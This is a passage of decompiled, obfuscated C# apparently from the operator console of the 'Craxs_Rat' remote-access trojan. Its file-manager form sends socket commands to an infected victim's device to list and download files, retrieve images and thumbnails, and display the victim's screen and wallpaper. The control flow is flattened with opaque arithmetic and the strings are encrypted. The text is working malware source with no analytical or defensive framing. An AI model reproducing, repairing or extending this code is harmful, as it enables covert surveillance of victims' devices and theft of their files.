            string[] strArray = ((Data) ((Jector) this).classClient).Keys.Split(':');
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Jector) this).classClient.SendMessage(new object[4]
            {
              (object) ((Jector) this).Client,
              Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u00318782C18 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0031251380A + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Craxs_Rat.sockets.Client.resultClient + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0035C350174 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + str1 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA), obj), (object) Data.VB\u0024StateMachine_39_HandelData.SPL_DATA), (object) ((Jector) this).Q), (object) Data.VB\u0024StateMachine_39_HandelData.SPL_DATA), (object) Accept.ImageViewer), (object) (EXGuarder.\u00328724A41 + ((Data._Closure\u0024__39\u002D12) ((Jector) this).classClient).UUID)),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0031E65044D),
              (object) ((Jector) this).classClient
            });
            num1 = (int) num2 * -461054890 ^ 890786727;
            continue;
          case 19:
            goto label_25;
          case 20:
            goto label_1;
          case 21:
            num1 = (int) num2 * 1978961422 ^ -1942201541;
            continue;
          case 22:
            // ISSUE: reference to a compiler-generated field
            ((Jector) this).FileDirectory = Conversions.ToString(Operators.ConcatenateObject((object) (((Data._Closure\u0024__39\u002D12) ((Jector) this).classClient).FolderUSER + EXGuarder.\u003444C4227), NewLateBinding.LateGet(this.DGV0.Tag, (Type) null, EXGuarder.\u003444D2C2D, new object[2]
            {
              (object) EXGuarder.\u0030E37112C,
              (object) EXGuarder.\u00302457176
            }, (string[]) null, (Type[]) null, (bool[]) null)));
            num1 = (int) num2 * 643904628 ^ 1907923784;
            continue;
          default:
            goto label_26;
        }
      }
label_25:
      return;
label_26:;
    }

    private void Viwimage_MouseUp(object sender, MouseEventArgs e)
    {
    }

    private void Viwimage_MouseLeave(object sender, EventArgs e)
    {
      ((Jector) this).ShowVideo = false;
      this.thumb_chk.Checked = true;
      this.thumb_chk.Refresh();
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      try
      {
        // ISSUE: reference to a compiler-generated field
        if (((Data._Closure\u0024__39\u002D3) ((Jector) this).classClient).isconnected)
        {
label_1:
          int num1 = -561862653;
          while (true)
          {
            int num2 = num1;
            uint num3;
            switch ((num3 = (uint) (~(-1259547724 - ((num2 ^ -(--836509927 ^ ~828948978 * 1486002785) + -~(1532246188 - 1646616173 ^ 1502705097 * 1096093285)) * -183527155 ^ 1279256657 * -653282854 * -1740738853 * -573540629)) - 627581358)) % 3U)
            {
              case 0:
                goto label_1;
              case 1:
                // ISSUE: reference to a compiler-generated field
                if (((Data._Closure\u0024__) ((Jector) this).classClient).isready)
                {
                  num1 = (int) num3 * -2084724464 ^ 206852683;
                  continue;
                }
                goto label_15;
              default:
                goto label_6;
            }
          }
label_15:
          return;
label_6:
          // ISSUE: reference to a compiler-generated field
          this.Text = string.Format(EXGuarder.\u0035F477512, (object) EXGuarder.\u003632E616B, (object) ((Data._Closure\u0024__39\u002D12) ((Jector) this).classClient).UUID);
          // ISSUE: reference to a compiler-generated field
          this.ClientPic.Image = (Image) ((Data._Closure\u0024__39\u002D17) ((Jector) this).classClient).Wallpaper;
          // ISSUE: reference to a compiler-generated field
          this.usrscreen.Image = (Image) reso.GetScreen(((Data._Closure\u0024__39\u002D10) ((Jector) this).classClient).Screen);
          try
          {
            // ISSUE: reference to a compiler-generated field
            if (((Data._Closure\u0024__39\u002D5) ((Jector) this).classClient).Row != null)
              ;
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else
          this.ClientPic.Image = (Image) Craxs_Rat.My.Resources.Resources.disconnected;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_12:
        int num4 = 1529386446;
        while (true)
        {
          int num5 = num4;
          uint num6;
          switch ((num6 = (uint) (~(-1259547724 - ((num5 ^ -(--836509927 ^ ~828948978 * 1486002785) + -~(1532246188 - 1646616173 ^ 1502705097 * 1096093285)) * -183527155 ^ 1279256657 * -653282854 * -1740738853 * -573540629)) - 627581358)) % 3U)
          {
            case 0:
              goto label_12;
            case 1:
              ProjectData.ClearProjectError();
              num4 = (int) num6 * -484434333 ^ 1183038436;
              continue;
            case 2:
              goto label_16;
            default:
              goto label_17;
          }
        }
label_16:
        return;
label_17:;
      }
    }

    private void ClearButton_Click(object sender, EventArgs e)
    {
    }

    private void Button2_Click(object sender, EventArgs e)
    {
      if (this.DGVDATA.SelectedRows.Count <= 0)
        return;
      IEnumerator enumerator;
      try
      {
        enumerator = this.DGVDATA.SelectedRows.GetEnumerator();
label_7:
        int num1 = enumerator.MoveNext() ? 1710278520 : (num1 = -2110641712);
        DataGridViewRow current;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -~((~~num1 - (-1550473153 * (-1137989288 * 135279555) + (462858088 + 2023975352 - (722593201 - 68530139)))) * 1303098649)) % 6U)
          {
            case 0:
              num1 = 1710278520;
              continue;
            case 1:
              current.Dispose();
              num1 = (int) num2 * -192872451 ^ -99216282;
              continue;
            case 2:
              goto label_7;
            case 3:
              goto label_9;
            case 4:
              current.Tag = (object) EXGuarder.\u0035753434D;
              current.Cells[4].Value = (object) EXGuarder.\u0035D724C40;
              current.DefaultCellStyle.ForeColor = Color.Red;
              num1 = (int) num2 * 1842730548 ^ 1558841660;
              continue;
            case 5:
              current = (DataGridViewRow) enumerator.Current;
              int num3;
              num1 = num3 = current.Tag.ToString().Length <= 1 ? 591136001 : (num3 = -165805793);
              continue;
            default:
              goto label_4;
          }
        }
label_9:
        return;
label_4:;
      }
      finally
      {
        if (enumerator is IDisposable)
        {
label_11:
          int num4 = -206342540;
          while (true)
          {
            uint num5;
            switch ((num5 = (uint) -~((~~num4 - (-1550473153 * (-1137989288 * 135279555) + (462858088 + 2023975352 - (722593201 - 68530139)))) * 1303098649)) % 3U)
            {
              case 1:
                (enumerator as IDisposable).Dispose();
                num4 = (int) num5 * 938739089 ^ -713561823;
                continue;
              case 2:
                goto label_11;
              default:
                goto label_15;
            }
          }
        }
label_15:;
      }
    }

    private void Usrbtry_MouseEnter(object sender, EventArgs e)
    {
    }

    private void ClientPic_MouseEnter(object sender, EventArgs e)
    {
    }

    private void MetroSetBadge1_Click(object sender, EventArgs e)
    {
      if (Operators.CompareString(this.Downpic.Tag.ToString(), EXGuarder.\u0030C05384A, false) != 0)
        goto label_11;
label_1:
      int num1 = -2070233733;
label_2:
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (((--312997866 ^ ~1663589346) - 1630857070) * 897868347 - (num2 - -(~~-271574919 - (--1532629586 + -1304169905 * 1190623811) + 988304215 * (-2014392945 - 2028748409 - (-734361372 ^ -1636177328)))) - 1682130209)) % 10U)
        {
          case 0:
            goto label_1;
          case 1:
            this.DGVDATA.SendToBack();
            num1 = (int) num3 * -553793671 ^ 919458769;
            continue;
          case 2:
            goto label_3;
          case 3:
            this.cancelbtn.Enabled = false;
            num1 = (int) num3 * 842528670 ^ -265234806;
            continue;
          case 4:
            this.ClearButton.Enabled = true;
            this.ClearButton.Visible = true;
            this.cancelbtn.Enabled = true;
            num1 = (int) num3 * 1432280510 ^ 1050629993;
            continue;
          case 5:
            this.cancelbtn.Visible = true;
            this.DGVDATA.BringToFront();
            num1 = (int) num3 * 83602819 ^ 2119111208;
            continue;
          case 6:
            goto label_11;
          case 7:
            this.Downpic.Tag = (object) EXGuarder.\u0032E345018;
            num1 = (int) num3 * 1575443671 ^ 1561226151;
            continue;
          case 8:
            this.cancelbtn.Visible = false;
            num1 = (int) num3 * -2126360283 ^ 306410627;
            continue;
          case 9:
            num1 = (int) num3 * 1173656725 ^ -1883364013;
            continue;
          default:
            goto label_12;
        }
      }
label_3:
      return;
label_12:
      return;
label_11:
      this.Downpic.Tag = (object) EXGuarder.\u0030C05384A;
      this.ClearButton.Enabled = false;
      this.ClearButton.Visible = false;
      num1 = -1686665209;
      goto label_2;
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsvsdegvdsergef(object sender, EventArgs e)
    {
      try
      {
        // ISSUE: reference to a compiler-generated field
        string path = Conversions.ToString(Operators.ConcatenateObject((object) (((Data._Closure\u0024__39\u002D12) ((Jector) this).classClient).FolderUSER + EXGuarder.\u00344344204), NewLateBinding.LateGet(this.DGV0.Tag, (Type) null, EXGuarder.\u00348172C76, new object[2]
        {
          (object) EXGuarder.\u0030F092500,
          (object) EXGuarder.\u0036A685014
        }, (string[]) null, (Type[]) null, (bool[]) null)));
label_1:
        int num1 = 1533162028;
        while (true)
        {
          int num2 = num1;
          uint num3;
          string language;
          int num4;
          int count;
          int num5;
          switch ((num3 = (uint) (~(~(~1571684433 ^ ~1759506974) - (num2 - -(2042465003 * (-1393112483 * -1251656733 - (828977251 + 537954385)) * -1540269161) + (~(-1305455315 * -592484985 ^ -2095985681) ^ ~-1509486884))) * -1868085249)) % 18U)
          {
            case 0:
              int num6 = Operators.CompareString(language, EXGuarder.\u0031D13062C, false) == 0 ? 992658 : (num6 = 1539892538);
              num1 = num6 ^ (int) num3 * -1038232187;
              continue;
            case 1:
              num5 = ((IEnumerable<string>) Directory.GetFiles(path, EXGuarder.\u003752D5656)).Count<string>();
              num1 = (int) num3 * 1796497197 ^ 1607400846;
              continue;
            case 2:
              this.CountText.Text = EXGuarder.\u003034C2D42 + Conversions.ToString(num4);
              this.Selecttext.Text = EXGuarder.\u003460A5950 + Conversions.ToString(this.DGV0.SelectedRows.Count);
              this.seentext.Text = EXGuarder.\u0031A4D153E + num5.ToString() + (count > 0 ? Strings.Space(10) + EXGuarder.\u003444F4929 + Conversions.ToString(((Jector) this).Clipboard.Count) : EXGuarder.\u003241C5111);
              num1 = 638687111;
              continue;
            case 3:
              int num7 = Operators.CompareString(language, EXGuarder.\u003416F120E, false) != 0 ? 1933541196 : (num7 = 2027013738);
              num1 = num7 ^ (int) num3 * 1191190503;
              continue;
            case 4:
              int num8 = Operators.CompareString(language, EXGuarder.\u003563B4E53, false) == 0 ? 1986552195 : (num8 = -1866998353);
              num1 = num8 ^ (int) num3 * 257065397;
              continue;
            case 5:
              num4 = checked (this.DGV0.Rows.Count - 1);
              num1 = -1971832843;
              continue;
            case 6:
              num1 = (int) num3 * -107905064 ^ 760318951;
              continue;
            case 7:
              goto label_3;
            case 8:
              this.Selecttext.Text = EXGuarder.\u003181C2821 + Conversions.ToString(this.DGV0.SelectedRows.Count);
              this.seentext.Text = EXGuarder.\u00327400A6A + num5.ToString() + (count > 0 ? Strings.Space(10) + EXGuarder.\u00328534F3A + Conversions.ToString(((Jector) this).Clipboard.Count) : EXGuarder.\u003241C5111);
              num1 = -1250216530;
              continue;
            case 9:
              count = ((Jector) this).Clipboard.Count;
              num1 = (int) num3 * -1689586778 ^ 1006292536;
              continue;
            case 10:
              num5 = 0;
              num1 = (int) num3 * 569969171 ^ -1978927649;
              continue;
            case 11:
              int num9 = !Directory.Exists(path) ? 742394163 : (num9 = 542167505);
              num1 = num9 ^ (int) num3 * 791059860;
              continue;
            case 12:
              language = RegistryHandler.Get_Language();
              num1 = (int) num3 * 541131467 ^ -1591115500;
              continue;
            case 13:
              this.CountText.Text = EXGuarder.\u00327556F56 + Conversions.ToString(num4);
              num1 = 1792524938;
              continue;
            case 14:
              this.Selecttext.Text = EXGuarder.\u0036302633E + Conversions.ToString(this.DGV0.SelectedRows.Count);
              num1 = (int) num3 * 567860451 ^ -1601087148;
              continue;
            case 15:
              this.CountText.Text = EXGuarder.\u00340157333 + Conversions.ToString(num4);
              num1 = (int) num3 * 542575062 ^ 1413732310;
              continue;
            case 16:
              this.seentext.Text = EXGuarder.\u003684B5D63 + num5.ToString() + (count > 0 ? Strings.Space(10) + EXGuarder.\u0034F510370 + Conversions.ToString(((Jector) this).Clipboard.Count) : EXGuarder.\u003241C5111);
              num1 = 638687111;
              continue;
            case 17:
              goto label_1;
            default:
              goto label_21;
          }
        }
label_3:
        return;
label_21:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Viwimage_MouseEnter(object sender, EventArgs e) => this.LoadVideo();

    private void Viwimage_MouseLeave_1(object sender, EventArgs e)
    {
      ((Jector) this).ShowVideo = false;
label_1:
      int num1 = 100642729;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -(~(-num1 * -685921493) * -949625729 + ~1458011444)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            this.thumb_chk.Refresh();
            num1 = (int) num2 * 1518669336 ^ 260459294;
            continue;
          case 2:
            goto label_3;
          case 3:
            this.thumb_chk.Checked = true;
            num1 = (int) num2 * -1004995866 ^ 681005805;
            continue;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
    {
      if (((Jector) this).classClient == null)
        return;
label_1:
      int num1 = -1348467643;
      object[] ParametersObjects;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (--(-(num1 * -69490155) + (1789352435 ^ -2110324005 * (456807922 ^ -531378831))) - 14754168)) % 4U)
        {
          case 0:
            ((Jector) this).classClient.SendMessage(ParametersObjects);
            num1 = (int) num2 * -1409466070 ^ -281177600;
            continue;
          case 1:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) ((Jector) this).Client,
              (object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u0034E2F5966 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003143D3A30 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager._Closure\u0024__.getfiles + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00363773004 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + EXGuarder.\u00347717649),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0035E2F4B29),
              (object) ((Jector) this).classClient
            };
            num1 = (int) num2 * 438367979 ^ 188716301;
            continue;
          case 2:
            goto label_6;
          case 3:
            goto label_1;
          default:
            goto label_7;
        }
      }
label_6:
      return;
label_7:;
    }

    private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
    {
      if (((Jector) this).classClient == null)
        return;
label_1:
      int num1 = -1033359625;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-(~num1 - (-~(92950233 * -198151773) ^ -1337313190 ^ ~(2101391330 ^ 2142889368))) + -1949364149 * (232400990 + 594641764) ^ ~-1123684935 ^ -328714227)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_5;
          case 2:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Jector) this).classClient.SendMessage(new object[4]
            {
              (object) ((Jector) this).Client,
              (object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u003102C5D63 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0034F11173B + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager._Closure\u0024__.getfiles + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003761A0E58 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + EXGuarder.\u00310453543),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0030C436139),
              (object) ((Jector) this).classClient
            });
            num1 = (int) num2 * 288577654 ^ 1331425927;
            continue;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
    {
      if (((Jector) this).classClient == null)
        return;
label_1:
      int num1 = 1282716865;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((~(num1 + ~~(2017532507 * (523873981 - -19092630)) * -591996635 - 1552989405 * ~~-936542073 * -748565589) - (--375601644 + 1883729738) + ~1188785991) * 1979136041)) % 3U)
        {
          case 0:
            goto label_5;
          case 1:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Jector) this).classClient.SendMessage(new object[4]
            {
              (object) ((Jector) this).Client,
              (object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u003541E653A + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00314394A73 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager._Closure\u0024__.getfiles + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0034E4A5375 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + EXGuarder.\u0036E307111),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0034A000E51),
              (object) ((Jector) this).classClient
            });
            num1 = (int) num2 * -424504261 ^ 335541491;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    private void DrakeUIButtonIcon4_Click(object sender, EventArgs e)
    {
      if (((Jector) this).classClient == null)
        return;
label_1:
      int num1 = -205758887;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (-640878739 - 2053434725 - -1234621851 - (~num2 - (~(--614287996 - --1376532120) ^ -1123537606) - 450182655 * (~1630254080 ^ -231721029 ^ 769415405)) - ~-731651861 - -16326928)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_5;
          case 2:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Jector) this).classClient.SendMessage(new object[4]
            {
              (object) ((Jector) this).Client,
              Operators.ConcatenateObject((object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u0032E382925 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003665C0D58 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager._Closure\u0024__.getfiles + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0035E4F7428 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA), this.Pback(Conversions.ToString(this.DGV0.Tag))),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00358045847),
              (object) ((Jector) this).classClient
            });
            num1 = (int) num3 * 428117920 ^ -1504893696;
            continue;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    private void DrakeUIButtonIcon5_Click(object sender, EventArgs e)
    {
      if (((Jector) this).classClient == null)
        return;
label_1:
      int num1 = -1460390609;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~~((num1 ^ ~(-(333939160 - 683325903) * 834420543 + (269153709 * -1560786413 - (915294884 - -555058609) + (--960282616 - (-1663144561 - 1318396243))))) - (~(-741448180 ^ 334081755 ^ -1063729839 * 418977305) - ~-(242612773 - 677831042))) - (1175913608 - -634150531) ^ -1400539941)) % 3U)
        {
          case 0:
            goto label_5;
          case 1:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Jector) this).classClient.SendMessage(new object[4]
            {
              (object) ((Jector) this).Client,
              Operators.ConcatenateObject((object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u00364582744 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0036325725D + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager._Closure\u0024__.getfiles + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00361103962 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA), this.DGV0.Tag),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u003771E1A6B),
              (object) ((Jector) this).classClient
            });
            num1 = (int) num2 * 1239978821 ^ -1165450426;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    private void DrakeUIButtonIcon6_Click(object sender, EventArgs e)
    {
      if (this.DGV0.SelectedRows.Count <= 0)
        return;
label_1:
      int num1 = 1852253170;
      object[] ParametersObjects;
      int num2;
      int index;
      string str;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (~~~num1 * -1455192435 * 1022747895)) % 10U)
        {
          case 0:
            ((Jector) this).classClient.SendMessage(ParametersObjects);
            num1 = (int) num3 * 643857072 ^ 1758720003;
            continue;
          case 1:
            num2 = checked (this.DGV0.SelectedRows.Count - 1);
            num1 = (int) num3 * -1877105181 ^ -1397918331;
            continue;
          case 2:
            goto label_1;
          case 3:
            index = num2;
            num1 = (int) num3 * 1587944175 ^ -1011179616;
            continue;
          case 4:
            str = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, (object) EXGuarder.\u00308623920), this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[1].Value));
            int num4 = ((Jector) this).classClient == null ? 1232868727 : (num4 = 248342640);
            num1 = num4 ^ (int) num3 * -1914867034;
            continue;
          case 5:
            string[] strArray = ((Data) ((Jector) this).classClient).Keys.Split(':');
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) ((Jector) this).Client,
              (object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u00370406E48 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0036C143322 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Craxs_Rat.sockets.Client.resultClient + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0030C145218 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + str + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + Accept.down_info + EXGuarder.\u00331245835 + ((Data._Closure\u0024__39\u002D12) ((Jector) this).classClient).UUID + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + Accept.downByte + EXGuarder.\u00331245835 + ((Data._Closure\u0024__39\u002D12) ((Jector) this).classClient).UUID + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + EXGuarder.\u00331245835 + ((Data._Closure\u0024__39\u002D12) ((Jector) this).classClient).UUID),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u003272E4B20),
              (object) ((Jector) this).classClient
            };
            num1 = (int) num3 * -559768678 ^ 2004661097;
            continue;
          case 6:
            checked { index += -1; }
            num1 = -1075656717;
            continue;
          case 7:
            int num5;
            num1 = num5 = Operators.CompareString(Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[0].Tag), EXGuarder.\u00367425A20, false) != 0 ? 144038339 : (num5 = 1152229957);
            continue;
          case 8:
            int num6;
            num1 = num6 = index >= 0 ? -131516856 : (num6 = -1261812156);
            continue;
          case 9:
            goto label_12;
          default:
            goto label_13;
        }
      }
label_12:
      return;
label_13:;
    }

    private void DrakeUIButtonIcon7_Click(object sender, EventArgs e)
    {
      if (this.viwimage.Image == null)
        return;
label_1:
      int num1 = 730576198;
      Bitmap bitmap;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((-(-(num1 * -2062291603) - (~(-975692719 - 589425577) + -(76983129 - 1691381846))) ^ -929447276 * 2045030757) * 1805106411)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_6;
          case 2:
            bitmap = new Bitmap(this.viwimage.Image);
            bitmap.RotateFlip(RotateFlipType.Rotate90FlipNone);
            num1 = (int) num2 * 663283117 ^ 1697966259;
            continue;
          case 3:
            this.viwimage.Image = (Image) bitmap;
            num1 = (int) num2 * 1281578784 ^ -919272105;
            continue;
          default:
            goto label_7;
        }
      }
label_6:
      return;
label_7:;
    }

    private void DrakeUIButtonIcon8_Click(object sender, EventArgs e)
    {
      if (((Jector) this).classClient == null)
        return;
label_1:
      int num1 = -1933713087;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~-~((num1 + ((-696523661 * 733273515 - (-1853172058 + (-107588889 - -1220439471))) * 502251291 - ((1525479458 - 764900465 - 476724694 ^ -967736486 ^ 1802334032 * 1987942401) - 722944288)) - (((728296046 ^ -1743484866) + -203954495 * 1513110751) * 535009095 - (50713800 - 1726440159 ^ -626839459 * -423527529) * 1524442735)) * 257622257)) % 6U)
        {
          case 0:
            Process.Start(str);
            num1 = 2137583702;
            continue;
          case 1:
            goto label_8;
          case 2:
            // ISSUE: reference to a compiler-generated field
            str = ((Data._Closure\u0024__39\u002D12) ((Jector) this).classClient).FolderUSER + EXGuarder.\u003072E4142;
            num1 = (int) num2 * -1092888872 ^ -172857980;
            continue;
          case 3:
            Directory.CreateDirectory(str);
            num1 = (int) num2 * 596581687 ^ 535808370;
            continue;
          case 4:
            goto label_1;
          case 5:
            int num3 = Directory.Exists(str) ? -993943660 : (num3 = -2117685605);
            num1 = num3 ^ (int) num2 * -349953229;
            continue;
          default:
            goto label_9;
        }
      }
label_8:
      return;
label_9:;
    }

    private void DrakeUIButtonIcon1_Click_1(object sender, EventArgs e)
    {
      try
      {
        if (this.DGVDATA.SelectedRows.Count <= 0)
          return;
        IEnumerator enumerator;
        try
        {
          enumerator = this.DGVDATA.SelectedRows.GetEnumerator();
label_2:
          int num1 = 1512480137;
          DataGridViewRow current;
          while (true)
          {
            uint num2;
            switch ((num2 = (uint) ~-(~num1 + ((-2038625665 * -1404487687 + (-245172960 - 714137738)) * 1656703645 - ~-1025792432))) % 8U)
            {
              case 0:
                current.Dispose();
                num1 = (int) num2 * 1813277690 ^ 616541519;
                continue;
              case 1:
                int num3;
                num1 = num3 = enumerator.MoveNext() ? 196521150 : (num3 = 2108493114);
                continue;
              case 2:
                current = (DataGridViewRow) enumerator.Current;
                int num4;
                num1 = num4 = current.Tag.ToString().Length <= 1 ? 427070479 : (num4 = 793811091);
                continue;
              case 3:
                current.Cells[4].Value = (object) EXGuarder.\u00338001473;
                current.DefaultCellStyle.ForeColor = Color.Red;
                num1 = (int) num2 * 2008009802 ^ 102365270;
                continue;
              case 4:
                goto label_2;
              case 5:
                current.Tag = (object) EXGuarder.\u003072E542D;
                num1 = (int) num2 * -1287299621 ^ -2064965878;
                continue;
              case 6:
                goto label_21;
              case 7:
                num1 = (int) num2 * 1635198266 ^ 279391593;
                continue;
              default:
                goto label_17;
            }
          }
label_21:
          return;
label_17:;
        }
        finally
        {
          if (enumerator is IDisposable)
          {
label_12:
            int num5 = 166289802;
            while (true)
            {
              uint num6;
              switch ((num6 = (uint) ~-(~num5 + ((-2038625665 * -1404487687 + (-245172960 - 714137738)) * 1656703645 - ~-1025792432))) % 3U)
              {
                case 1:
                  (enumerator as IDisposable).Dispose();
                  num5 = (int) num6 * -2113421498 ^ 1113905889;
                  continue;
                case 2:
                  goto label_12;
                default:
                  goto label_16;
              }
            }
          }
label_16:;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_19:
        int num7 = 703680774;
        while (true)
        {
          uint num8;
